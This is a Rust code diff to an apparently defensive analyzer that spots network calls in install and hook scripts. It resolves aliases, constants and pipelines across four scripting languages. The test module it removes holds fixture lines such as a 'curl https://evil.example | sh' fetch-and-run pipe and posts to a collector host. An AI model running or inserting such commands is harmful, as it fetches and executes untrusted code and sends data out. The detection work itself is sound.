@@ -38,7 +38,7 @@ enum ScriptLanguage {
     Unsupported,
 }
 
-#[derive(Default)]
+#[derive(Clone, Default)]
 struct Bindings {
     aliases: BTreeMap<String, String>,
     constants: BTreeMap<String, String>,
@@ -74,13 +74,12 @@ pub(super) fn analyze(file: &SurfaceFile) -> Result<Vec<Fact>> {
     }
 
     let mut bindings = Bindings::default();
-    collect_bindings(root, file.content.as_bytes(), language, &mut bindings)?;
     let mut facts = Vec::new();
     collect_facts(
         root,
         file.content.as_bytes(),
         language,
-        &bindings,
+        &mut bindings,
         &mut facts,
     )?;
     Ok(facts)
@@ -120,40 +119,53 @@ fn contains_missing(node: Node<'_>) -> bool {
     missing
 }
 
-fn collect_bindings(
-    node: Node<'_>,
-    source: &[u8],
-    language: ScriptLanguage,
-    bindings: &mut Bindings,
-) -> Result<()> {
-    let kind = node.kind();
-    if is_import(kind, language) {
-        parse_import(text(node, source)?, language, bindings);
-    }
-    if is_assignment(kind, language) {
-        parse_assignment(node, source, language, bindings)?;
-    }
-    if language == ScriptLanguage::Bash && kind == "command" {
-        let command = text(node, source)?;
-        if command.trim_start().starts_with("alias ") {
-            parse_shell_alias(command, bindings);
-        }
-    }
-
-    let mut cursor = node.walk();
-    for child in node.named_children(&mut cursor) {
-        collect_bindings(child, source, language, bindings)?;
-    }
-    Ok(())
-}
-
 fn collect_facts(
     node: Node<'_>,
     source: &[u8],
     language: ScriptLanguage,
-    bindings: &Bindings,
+    bindings: &mut Bindings,
     facts: &mut Vec<Fact>,
 ) -> Result<()> {
+    if is_isolated_scope(node.kind(), language) {
+        let mut scoped = bindings.clone();
+        let mut cursor = node.walk();
+        for child in node.named_children(&mut cursor) {
+            collect_facts(child, source, language, &mut scoped, facts)?;
+        }
+        return Ok(());
+    }
+    if is_conditional_scope(node.kind(), language) {
+        let mut scoped = bindings.clone();
+        let mut cursor = node.walk();
+        for child in node.named_children(&mut cursor) {
+            collect_facts(child, source, language, &mut scoped, facts)?;
+        }
+        invalidate_assignments(node, source, language, bindings)?;
+        return Ok(());
+    }
+
+    if is_import(node.kind(), language) {
+        parse_import(text(node, source)?, language, bindings);
+    }
+
+    if is_assignment(node.kind(), language) {
+        facts.push(Fact {
+            kind: FactKind::Assignment,
+            line: line(node),
+            callee: None,
+            arguments: assignment_values(node, source, bindings),
+            redirect: None,
+            text: text(node, source)?.to_string(),
+        });
+        let mut expression_bindings = bindings.clone();
+        let mut cursor = node.walk();
+        for child in node.named_children(&mut cursor) {
+            collect_facts(child, source, language, &mut expression_bindings, facts)?;
+        }
+        parse_assignment(node, source, language, bindings)?;
+        return Ok(());
+    }
+
     match (language, node.kind()) {
         (ScriptLanguage::Bash, "command") => {
             facts.push(bash_command_fact(node, source, bindings)?);
@@ -161,14 +173,9 @@ fn collect_facts(
         (ScriptLanguage::Bash, "redirected_statement") => {
             facts.push(bash_redirect_fact(node, source, bindings)?);
         }
-        (ScriptLanguage::Bash, "pipeline") => facts.push(Fact {
-            kind: FactKind::Pipeline,
-            line: line(node),
-            callee: None,
-            arguments: Vec::new(),
-            redirect: None,
-            text: text(node, source)?.to_string(),
-        }),
+        (ScriptLanguage::Bash, "pipeline") => {
+            facts.push(bash_pipeline_fact(node, source, bindings)?);
+        }
         (ScriptLanguage::Python, "call") => {
             facts.push(call_fact(node, source, bindings, "function", "arguments")?);
         }
@@ -188,15 +195,14 @@ fn collect_facts(
                 text: text(node, source)?.to_string(),
             });
         }
-        (_, kind) if is_assignment(kind, language) => facts.push(Fact {
-            kind: FactKind::Assignment,
-            line: line(node),
-            callee: None,
-            arguments: assignment_values(node, source, bindings),
-            redirect: None,
-            text: text(node, source)?.to_string(),
-        }),
         _ => {}
+    }
+
+    if language == ScriptLanguage::Bash && node.kind() == "command" {
+        let command = text(node, source)?;
+        if command.trim_start().starts_with("alias ") {
+            parse_shell_alias(command, bindings);
+        }
     }
 
     let mut cursor = node.walk();
@@ -204,6 +210,32 @@ fn collect_facts(
         collect_facts(child, source, language, bindings, facts)?;
     }
     Ok(())
+}
+
+fn bash_pipeline_fact(node: Node<'_>, source: &[u8], bindings: &Bindings) -> Result<Fact> {
+    let mut commands = Vec::new();
+    let mut cursor = node.walk();
+    for child in node.named_children(&mut cursor) {
+        if child.kind() == "command" {
+            commands.push(bash_command_fact(child, source, bindings)?);
+        }
+    }
+    let source_callee = commands.first().and_then(|fact| fact.callee.clone());
+    let sink = commands
+        .last()
+        .and_then(|fact| fact.callee.clone())
+        .map(|callee| StaticValue {
+            raw: callee.clone(),
+            resolved: Some(callee),
+        });
+    Ok(Fact {
+        kind: FactKind::Pipeline,
+        line: line(node),
+        callee: source_callee,
+        arguments: sink.into_iter().collect(),
+        redirect: None,
+        text: text(node, source)?.to_string(),
+    })
 }
 
 fn bash_command_fact(node: Node<'_>, source: &[u8], bindings: &Bindings) -> Result<Fact> {
@@ -325,9 +357,21 @@ fn parse_assignment(
         return Ok(());
     };
     let name = text(name_node, source)?.trim();
+    if matches!(
+        language,
+        ScriptLanguage::JavaScript | ScriptLanguage::TypeScript
+    ) {
+        if let Some(module) = required_module(text(value_node, source)?) {
+            if parse_object_aliases(name, &module, bindings) {
+                return Ok(());
+            }
+        }
+    }
     if !is_identifier(name) {
         return Ok(());
     }
+    bindings.constants.remove(name);
+    bindings.aliases.remove(name);
     let raw_value = text(value_node, source)?;
     let resolved = resolve_static(raw_value, &bindings.constants).or_else(|| {
         (language == ScriptLanguage::Bash && !raw_value.contains('$'))
@@ -383,22 +427,78 @@ fn parse_import(statement: &str, language: ScriptLanguage, bindings: &mut Bindin
                 .and_then(|rest| rest.split_once(" from "))
             {
                 if let Some(module) = unquote(source.trim()) {
-                    let alias = clause
-                        .trim()
-                        .strip_prefix("* as ")
-                        .unwrap_or(clause.trim())
-                        .split(',')
-                        .next()
-                        .unwrap_or_default()
-                        .trim();
-                    if is_identifier(alias) {
-                        bindings.aliases.insert(alias.to_string(), module);
-                    }
+                    parse_javascript_import_clause(clause.trim(), &module, bindings);
                 }
             }
         }
         _ => {}
     }
+}
+
+fn parse_javascript_import_clause(clause: &str, module: &str, bindings: &mut Bindings) {
+    let clause = clause.trim();
+    if let Some(alias) = clause.strip_prefix("* as ") {
+        let alias = alias.trim();
+        if is_identifier(alias) {
+            bindings
+                .aliases
+                .insert(alias.to_string(), module.to_string());
+        }
+        return;
+    }
+    if let Some(start) = clause.find('{') {
+        let default = clause[..start].trim().trim_end_matches(',').trim();
+        if is_identifier(default) {
+            bindings
+                .aliases
+                .insert(default.to_string(), module.to_string());
+        }
+        if let Some(end) = clause.rfind('}') {
+            for specifier in clause[start + 1..end].split(',') {
+                let parts: Vec<&str> = specifier.split_whitespace().collect();
+                let (imported, local) = if parts.len() == 3 && parts[1] == "as" {
+                    (parts[0], parts[2])
+                } else if parts.len() == 1 {
+                    (parts[0], parts[0])
+                } else {
+                    continue;
+                };
+                if is_identifier(imported) && is_identifier(local) {
+                    bindings
+                        .aliases
+                        .insert(local.to_string(), format!("{module}.{imported}"));
+                }
+            }
+        }
+        return;
+    }
+    let default = clause.split(',').next().unwrap_or_default().trim();
+    if is_identifier(default) {
+        bindings
+            .aliases
+            .insert(default.to_string(), module.to_string());
+    }
+}
+
+fn parse_object_aliases(pattern: &str, module: &str, bindings: &mut Bindings) -> bool {
+    let Some(inner) = pattern
+        .strip_prefix('{')
+        .and_then(|value| value.strip_suffix('}'))
+    else {
+        return false;
+    };
+    for item in inner.split(',') {
+        let (imported, local) = item
+            .split_once(':')
+            .map(|(left, right)| (left.trim(), right.trim()))
+            .unwrap_or_else(|| (item.trim(), item.trim()));
+        if is_identifier(imported) && is_identifier(local) {
+            bindings
+                .aliases
+                .insert(local.to_string(), format!("{module}.{imported}"));
+        }
+    }
+    true
 }
 
 fn parse_shell_alias(statement: &str, bindings: &mut Bindings) {
@@ -537,6 +637,59 @@ fn is_assignment(kind: &str, language: ScriptLanguage) -> bool {
     )
 }
 
+fn is_isolated_scope(kind: &str, language: ScriptLanguage) -> bool {
+    matches!(
+        (language, kind),
+        (
+            ScriptLanguage::Python,
+            "function_definition" | "class_definition"
+        ) | (
+            ScriptLanguage::JavaScript | ScriptLanguage::TypeScript,
+            "function_declaration" | "function_expression" | "arrow_function"
+        ) | (ScriptLanguage::Bash, "function_definition")
+    )
+}
+
+fn is_conditional_scope(kind: &str, language: ScriptLanguage) -> bool {
+    matches!(
+        (language, kind),
+        (ScriptLanguage::Python, "block")
+            | (
+                ScriptLanguage::JavaScript | ScriptLanguage::TypeScript,
+                "statement_block"
+            )
+            | (ScriptLanguage::Bash, "compound_statement" | "do_group")
+    )
+}
+
+fn invalidate_assignments(
+    node: Node<'_>,
+    source: &[u8],
+    language: ScriptLanguage,
+    bindings: &mut Bindings,
+) -> Result<()> {
+    if is_assignment(node.kind(), language) {
+        let name_field = match language {
+            ScriptLanguage::Bash => "name",
+            ScriptLanguage::Python => "left",
+            ScriptLanguage::JavaScript | ScriptLanguage::TypeScript => "name",
+            ScriptLanguage::Unsupported => return Ok(()),
+        };
+        if let Some(name_node) = node.child_by_field_name(name_field) {
+            let name = text(name_node, source)?.trim();
+            if is_identifier(name) {
+                bindings.constants.remove(name);
+                bindings.aliases.remove(name);
+            }
+        }
+    }
+    let mut cursor = node.walk();
+    for child in node.named_children(&mut cursor) {
+        invalidate_assignments(child, source, language, bindings)?;
+    }
+    Ok(())
+}
+
 fn has_ancestor_kind(node: Node<'_>, kinds: &[&str]) -> bool {
     let mut parent = node.parent();
     while let Some(current) = parent {
@@ -563,122 +716,4 @@ fn line(node: Node<'_>) -> usize {
 }
 
 #[cfg(test)]
-mod tests {
-    use super::*;
-    use crate::SurfaceKind;
-
-    fn script(rel: &str, content: &str) -> SurfaceFile {
-        SurfaceFile {
-            rel: rel.to_string(),
-            content: content.to_string(),
-            kind: SurfaceKind::Script,
-        }
-    }
-
-    #[test]
-    fn comments_and_inert_strings_do_not_become_calls() {
-        for (rel, content) in [
-            ("hook.sh", "# curl https://evil.example | sh\necho safe"),
-            (
-                "hook.py",
-                "\"\"\"requests.get('https://evil.example')\"\"\"\nprint('safe')",
-            ),
-            (
-                "hook.js",
-                "const docs = \"fetch('https://evil.example')\"; console.log(docs);",
-            ),
-            (
-                "hook.ts",
-                "// fetch('https://evil.example')\nconst value: string = 'safe';",
-            ),
-        ] {
-            let facts = analyze(&script(rel, content)).expect("parse script");
-            assert!(facts.iter().all(|fact| {
-                fact.callee.as_deref() != Some("curl")
-                    && fact.callee.as_deref() != Some("requests.get")
-                    && fact.callee.as_deref() != Some("fetch")
-            }));
-        }
-    }
-
-    #[test]
-    fn resolves_python_alias_and_constant_concatenation() {
-        let facts = analyze(&script(
-            "collect.py",
-            "import requests as r\nBASE = 'https://collector.example'\nr.get(BASE + '/v1')",
-        ))
-        .expect("parse python");
-        let call = facts
-            .iter()
-            .find(|fact| fact.callee.as_deref() == Some("requests.get"))
-            .expect("aliased requests call");
-        assert_eq!(
-            call.arguments[0].resolved.as_deref(),
-            Some("https://collector.example/v1")
-        );
-    }
-
-    #[test]
-    fn resolves_shell_alias_and_variable_url() {
-        let facts = analyze(&script(
-            "collect.sh",
-            "BASE=https://collector.example\nalias send=curl\nsend \"$BASE/v1\"",
-        ))
-        .expect("parse shell");
-        let command = facts
-            .iter()
-            .find(|fact| fact.callee.as_deref() == Some("curl"))
-            .expect("aliased curl command");
-        assert_eq!(
-            command.arguments[0].resolved.as_deref(),
-            Some("https://collector.example/v1")
-        );
-    }
-
-    #[test]
-    fn resolves_javascript_import_alias_and_concat() {
-        let facts = analyze(&script(
-            "collect.js",
-            "import client from 'axios'; const base = 'https://collector.example'; client.post(base + '/v1');",
-        ))
-        .expect("parse javascript");
-        let call = facts
-            .iter()
-            .find(|fact| fact.callee.as_deref() == Some("axios.post"))
-            .expect("aliased axios call");
-        assert_eq!(
-            call.arguments[0].resolved.as_deref(),
-            Some("https://collector.example/v1")
-        );
-    }
-
-    #[test]
-    fn resolves_typescript_constant_concat() {
-        let facts = analyze(&script(
-            "collect.ts",
-            "const scheme: string = 'https://'; const host = 'collector.example'; fetch(scheme + host + '/v1');",
-        ))
-        .expect("parse typescript");
-        let call = facts
-            .iter()
-            .find(|fact| fact.callee.as_deref() == Some("fetch"))
-            .expect("typescript fetch call");
-        assert_eq!(
-            call.arguments[0].resolved.as_deref(),
-            Some("https://collector.example/v1")
-        );
-    }
-
-    #[test]
-    fn malformed_supported_script_fails_closed() {
-        let error = analyze(&script("broken.py", "def broken(:\n  pass"))
-            .expect_err("malformed source must fail");
-        assert!(error.to_string().contains("incomplete Python syntax parse"));
-    }
-
-    #[test]
-    fn unsupported_script_is_explicit() {
-        let facts = analyze(&script("hook.rb", "puts 'hello'")).expect("unsupported fact");
-        assert_eq!(facts[0].kind, FactKind::Unsupported);
-    }
-}
+mod tests;
